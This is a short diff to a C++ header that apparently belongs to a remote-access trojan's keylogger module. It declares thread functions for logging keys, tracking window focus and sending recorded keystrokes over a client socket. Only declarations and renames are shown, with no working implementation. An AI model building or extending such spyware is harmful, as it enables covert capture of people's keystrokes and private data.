@@ -14,16 +14,17 @@
 class CKeyboardManager1 : public CManager
 {
 public:
-    CKeyboardManager1(CClientSocket *pClient);
+    CKeyboardManager1(CClientSocket *pClient, int n=0);
     virtual ~CKeyboardManager1();
     virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
     static DWORD WINAPI KeyLogger(LPVOID lparam);
-    static DWORD WINAPI SendDate(LPVOID lparam);
+    static DWORD WINAPI SendData(LPVOID lparam);
 
     HANDLE m_hWorkThread,m_hSendThread;
     DWORD dKeyBoardSize;
-    TCHAR	strRecordFile[MAX_PATH];
+    TCHAR	m_strRecordFile[MAX_PATH];
 private:
+    BOOL IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool HasData);
     int sendStartKeyBoard();
     int sendOfflineRecord(DWORD	dwRead  = 0);
     int sendKeyBoardData(LPBYTE lpData, UINT nSize);
